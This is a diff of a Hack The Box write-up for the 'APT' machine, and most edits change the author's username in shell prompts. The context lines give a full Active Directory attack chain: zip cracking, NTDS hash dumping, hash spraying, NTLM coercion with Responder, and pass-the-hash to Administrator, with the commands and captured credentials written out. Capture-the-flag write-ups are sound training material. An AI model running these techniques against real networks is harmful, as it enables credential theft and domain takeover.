@@ -9,6 +9,7 @@ avatar: assets/htb/apt.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/APT
 ---
+
 ## Enumeration
 
 ### Nmap scan
@@ -16,7 +17,7 @@ htb_url: https://app.hackthebox.com/machines/APT
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ nmap -sCV -n -p- -Pn -vvvv -oA apt <YOUR_IP>
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 
@@ -58,7 +59,7 @@ I also could not ping that IP. This was not the way.
 ### Port 1135 - RPC
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ rpcclient -I <YOUR_IP> -U "" -N apt.htb -p 135           
 Cannot connect to server.  Error was NT_STATUS_CONNECTION_DISCONNECTED
 ```
@@ -125,7 +126,7 @@ if __name__ == "__main__":
 I copied the PoC from the site and modified the script to scan the IP of my target.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ python3 IOXIDResolver.py <YOUR_IP>
 [*] Retrieving network interface of <YOUR_IP>
 Address: apt
@@ -137,7 +138,7 @@ Address: dead:beef::4d93:3f31:7ea4:6f57
 After running it, I was presented with the hostname \(I assume\), the IPv4 address, and two IP46 addresses
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ ping -c 2 -6 dead:beef::b885:d62a:d679:573f                                                    1 ⨯
 PING dead:beef::b885:d62a:d679:573f(dead:beef::b885:d62a:d679:573f) 56 data bytes
 64 bytes from dead:beef::b885:d62a:d679:573f: icmp_seq=1 ttl=63 time=68.4 ms
@@ -151,7 +152,7 @@ rtt min/avg/max/mdev = 65.438/66.913/68.389/1.475 ms
 I was able to ping using the IP6 address. The TTL of 64 was a bit odd, not sure if that is normal for IPv6. It showed 127 like normal when pinging the IPv4 address.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ rpcclient -I dead:beef::b885:d62a:d679:573f -U "" -N apt.htb
 rpcclient $>
 ```
@@ -223,7 +224,7 @@ I searched for a way to enumerate Windows using ipv6 and found a newer version o
 Using the information from this tool, I learned how to search using smbclient with ipv6
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt/enum4linux-ng]
+┌──(kac0㉿kali)-[~/htb/apt/enum4linux-ng]
 └─$ smbclient -t 5 -W htb -U % -L //dead:beef::b885:d62a:d679:573f                               127 ⨯
 
         Sharename       Type      Comment
@@ -238,7 +239,7 @@ dead:beef::b885:d62a:d679:573f is an IPv6 address -- no workgroup available
 Was able to enumerate shares using smbclient.  the backup share looked interesting
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt/enum4linux-ng]
+┌──(kac0㉿kali)-[~/htb/apt/enum4linux-ng]
 └─$ smbclient -t 5 -W htb -U %  //dead:beef::b885:d62a:d679:573f/backup                            1 ⨯
 Try "help" to get a list of possible commands.
 smb: \> dir
@@ -254,7 +255,7 @@ getting file \backup.zip of size 10650961 as backup.zip (5794.6 KiloBytes/sec) (
 Inside the `backup` share I found a backup.zip and extracted it to my computer
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ unzip backup.zip             
 Archive:  backup.zip
    creating: Active Directory/
@@ -269,7 +270,7 @@ Archive:  backup.zip
 The zip file was password-protected, but not encrypted.  This was a very juicy find, indeed.  If I could extract these files, I could potentially get the password hashes of all of the domain users on this machine
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ zip2john backup.zip > backup.hash
 backup.zip/Active Directory/ is not encrypted!
 ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
@@ -286,7 +287,7 @@ option -o to pick a file at a time.
 next I used `zip2john` to extract the password hash
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
@@ -301,7 +302,7 @@ Session completed
 Then I loaded the hash into John.  It cracked in less than a second. The password was `iloveyousomuch`
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ unzip backup.zip
 Archive:  backup.zip
 [backup.zip] Active Directory/ntds.dit password: 
@@ -314,7 +315,7 @@ Archive:  backup.zip
 Using this password I was able to successfully extract all of the files
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ secretsdump.py -ntds 'Active Directory/ntds.dit' -system registry/SYSTEM -security registry/SECURITY LOCAL
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -355,10 +356,10 @@ APT$:CLEARTEXT:4[%fo'zG`&BhR3cP[)U2NVS\LEYO/&^)<9xj6%#9\\?uJ4YPb`DRK" IES2fXK"f,
 There were hundreds of users on this domain!  Luckily there were a couple of plaintext passwords
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ awk -F ":" '{print $1}' ntds.dump > users
 
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ wc -l users 
 7996 users
 ```
@@ -366,10 +367,10 @@ There were hundreds of users on this domain!  Luckily there were a couple of pla
 I was wrong...there were almost 8000 users!!
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ awk -F ":" '{print $1}' ntds.dump | grep -v "[*]" | sort | uniq  > users
                                                                                          
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ wc -l users                                             
 2004 users
 ```
@@ -377,7 +378,7 @@ I was wrong...there were almost 8000 users!!
 After looking in it a bit, I noticed there were duplicates.  After sorting and pulling out the unique entries there were only...2000 or so left.  Much more manageable, but a lot to go through still.
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ kerbrute_linux_amd64 userenum --dc apt.htb.local -d htb users                                  1 ⨯
 
     __             __               __     
@@ -400,21 +401,21 @@ Version: v1.0.3 (9dad6e1) - 03/29/21 - Ronnie Flathers @ropnop
 Using kerbrute I was able to find 3 valid users out of 2000+
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ awk -F":" '{print $3,$4}' ntds.dump | sed 's/ /:/g' > nt_hashes
 ```
 
 Now I needed to find a valid hash. I put all of the hashes in a file by themselves
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ crackmapexec smb apt.htb.local -u henry.vinson -H nt_hashes -d htb
 ```
 
 I tried using crackmapexec but it did not come up with any results (not sure if it even did anything...)
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:297f523d69d61de58b690f158f052c1d -dc-ip apt.htb.local htb/henry.vinson
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -424,7 +425,7 @@ Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was
 Using GetTGT.py from impacket I was able to check one hash, but there was no way to validate all of the hashes at one time
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ for x in $(cat nt_hashes);do getTGT.py -hashes x -dc-ip apt.htb.local htb/henry.vinson 2>/dev/null;done
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -434,7 +435,7 @@ not enough values to unpack (expected 2, got 1)
 I used some bash magic to run the same command for each line in my `nt_hashes` file.  It started giving a bunch of errors for all of the lines that didn't have both halves of the hash (this script from Impacket expects both halves)
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ for x in $(cat test);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson;done      
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -450,7 +451,7 @@ I pulled out one of the hashes and tried it with just one that was in the right 
 I had to install `ntpdate`
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ sudo ntpdate apt.htb.local                                                                     1 ⨯
 29 Mar 23:07:02 ntpdate[794852]: no server suitable for synchronization found
 ```
@@ -458,7 +459,7 @@ I had to install `ntpdate`
 After playing with my system time, I realized that it never jumped forwards for daylight savings time...
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ sudo ntpdate pool.ntp.org                                                                      1 ⨯
 29 Mar 23:14:48 ntpdate[842178]: step time server 194.36.144.87 offset -3599.289748 sec
 ```
@@ -466,7 +467,7 @@ After playing with my system time, I realized that it never jumped forwards for 
 I simply synced it with a known good ntp server (Note: I realised that I had to change my system clock for another HTB machine in the past (find name and link) so this was just reverting it...)
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ date
 Tue 30 Mar 2021 12:17:39 AM EDT
 ```
@@ -477,7 +478,7 @@ https://github.com/byt3bl33d3r/CrackMapExec/issues/339
 The next day, it was magicly working. I didn't restart the system or anything (I had actually only paused the vm)
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ for x in $(cat nt_hashes);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson 2>/dev/null;done                                                        
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -488,7 +489,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 This time I was able to enumerate the users (or at least was able to connect and get the PREAUTH_FAILED error).  
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ for x in $(cat nt_hashes);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson | grep -v Impacket | grep -v "KDC_ERR_PREAUTH_FAILED" | tee -a  valid_hash && echo $x >> valid_hash;done
 
 Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
@@ -499,18 +500,18 @@ I used a bit of bash hackery to remove the results that showed failed attempts a
 ** this is the way **
 *  https://github.com/byt3bl33d3r/CrackMapExec/issues/339
 ```
-┌──(zweilos㉿kali)-[/etc/ssh]
-└─$ sudo ssh zweilos@127.0.0.1 -L 445:apt.htb.local:445
+┌──(kac0㉿kali)-[/etc/ssh]
+└─$ sudo ssh kac0@127.0.0.1 -L 445:apt.htb.local:445
 ```
 
 I had to enable ssh on my machine, then do port forwarding.  
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ crackmapexec smb -d htb henry.vinson localhost   
 SMB         ::1             445    APT              [*] Windows Server 2016 Standard 14393 (name:APT) (domain:htb) (signing:True) (SMBv1:True)
                                                                                                        
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ crackmapexec smb -d htb henry.vinson -H aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb localhost
 ```
 
@@ -519,7 +520,7 @@ SMB         ::1             445    APT              [*] Windows Server 2016 Stan
 but other than getting the windows version information, I could not get this to connect afterwards
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ crackmapexec --verbose smb -d htb henry.vinson localhost
 DEBUG Passed args:
 {'aesKey': None,
@@ -604,7 +605,7 @@ If someone could tell me what I was doing wrong I would greatly appreciate it!!
 STill got time sync error, but this time only for one hash; all others reported PREAUTH error
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$cat valid_hash
 Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb
@@ -613,18 +614,18 @@ aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb
 couldn't resolve time sync errors...
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ export KRB5CCNAME=henry.vinson@htb.ccache
 ```
 
 * https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ net time -S apt.htb.local
 Tue Mar 30 21:38:19 2021
 
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ date
 Tue 30 Mar 2021 09:28:35 PM EDT
 ```
@@ -632,7 +633,7 @@ Tue 30 Mar 2021 09:28:35 PM EDT
 my errors were caused because the time was 10 minutes off...Thank you `net time`!!
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ for x in $(head -1 test);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson@apt.htb | grep -v Impacket | tee -a valid_hash3 && echo $x >> valid_hash3 ;done
 
 [*] Saving ticket in henry.vinson@apt.htb.ccache
@@ -643,7 +644,7 @@ And it worked!!
 ### push on
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb/henry.vinson@apt.htb.local
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -656,7 +657,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 The hash seemed to be valid! I got a listing of shares, though it wouldnt connect since they werent writeable
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb/henry.vinson@apt.htb.local 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -667,7 +668,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 denied using wmiexec.py
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb/henry.vinson@apt.htb.local
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -677,7 +678,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 I was starting to think that the hash was not valid, though it did enumerate shares...
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb/henry.vinson@apt.htb.local
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -690,7 +691,7 @@ I kept going down the list of impacket tools that were relevant
 https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ python3 /usr/local/bin/reg.py -dc-ip apt.htb.local -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb apt.htb.local query -keyName HKCU -s
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -701,7 +702,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 nothing seemed to work.  I tried each of these using the -k option after exporting the key to KRB5CCNAME and still couldnt progress
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ klist
 Ticket cache: FILE:henry.vinson@apt.htb.ccache
 Default principal: henry.vinson@HTB.LOCAL
@@ -716,12 +717,12 @@ Valid starting       Expires              Service principal
 So the ticket was expired.
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ for x in $(cat test);do getTGT.py -hashes $x -dc-ip apt.htb.local htb.local/henry.vinson@apt.htb | grep -v Impacket | tee -a  valid_hash;done
 
 [*] Saving ticket in henry.vinson@apt.htb.ccache
 
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ klist
 Ticket cache: FILE:henry.vinson@apt.htb.ccache
 Default principal: henry.vinson@HTB.LOCAL
@@ -740,8 +741,8 @@ I tried dumping the registry, and this time it took much, much, longer to output
 > Each registry key located under the HKEY_USERS hive corresponds to a user on the system and is named with that user's security identifier, or SID. The registry keys and registry values located under each SID control settings specific to that user, like mapped drives, installed printers, environment variables, desktop background, and much more, and is loaded when the user first logs on.
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
-└─$ python3 /home/zweilos/.local/bin/reg.py -k apt.htb.local query -keyName HKLM -s | tee regdump_HKLM
+┌──(kac0㉿kali)-[~/htb/apt]
+└─$ python3 /home/kac0/.local/bin/reg.py -k apt.htb.local query -keyName HKLM -s | tee regdump_HKLM
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -814,7 +815,7 @@ Searching for `Password` yeilded something that I had scrolled right past in my 
 ## Initial Foothold
 
 ```
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ evil-winrm -u henry.vinson_adm -p G1#Ny5@2dvht -i apt.htb.local                                1 ⨯
 
 Evil-WinRM shell v2.3
@@ -877,7 +878,7 @@ Mode                LastWriteTime         Length Name
 -ar---        3/31/2021   3:46 PM             34 user.txt
 
 [0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> type user.txt
-0be8****a6ca
+0be8************************a6ca
 ```
 
 I found the proof that I had made it inside, on the users Desktop
@@ -1044,7 +1045,7 @@ A value of '2' meant that NTLM hashes would be sent
 according to [https://book.hacktricks.xyz/windows/ntlm](https://book.hacktricks.xyz/windows/ntlm) I could abuse the print spooler service to get the machine to send the hash to my machine, where I could capture it with `responder`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ sudo responder -I tun0 --lm           
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
@@ -1194,7 +1195,7 @@ MpCmdRun: End Time:  Thu  Apr  01  2021 22:29:11
 The scan failed
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ sudo responder -I tun0 --lm           
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
@@ -1265,8 +1266,8 @@ I received an email very quickly from their server. It only took 32 seconds to f
 > `python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc LAB/DC2k8_1\$@172.16.102.15`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/apt]
-└─$ python3 /home/zweilos/.local/bin/secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 -just-dc HTB/APT\$@apt.htb.local
+┌──(kac0㉿kali)-[~/htb/apt]
+└─$ python3 /home/kac0/.local/bin/secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 -just-dc HTB/APT\$@apt.htb.local
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
@@ -1302,7 +1303,7 @@ Using the template from the blog I was able to dump the hashes from the machine.
 Now that I had the Administrator hash, it was time to crack it!
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ hashcat -O -D1,2 -a0 -m1000 admin.hash /usr/share/wordlists/rockyou.txt                      255 ⨯
 hashcat (v6.1.1) starting...
 
@@ -1331,7 +1332,7 @@ Stopped: Thu Apr  1 18:11:59 2021
 I was able to go through all of rockyou.txt in less than 10 seconds, but the password was not in it. I decided to just try to use the hash to log in instead
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/apt]
+┌──(kac0㉿kali)-[~/htb/apt]
 └─$ evil-winrm -u Administrator -H c370bddf384a691d811ff3495e8a72e2 -i apt.htb.local
 
 Evil-WinRM shell v2.3
@@ -1426,5 +1427,5 @@ Mode                LastWriteTime         Length Name
 -ar---         4/1/2021   9:35 AM             34 root.txt
 
 [0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> cat root.txt
-366c****bd15
+366c************************bd15
 ```
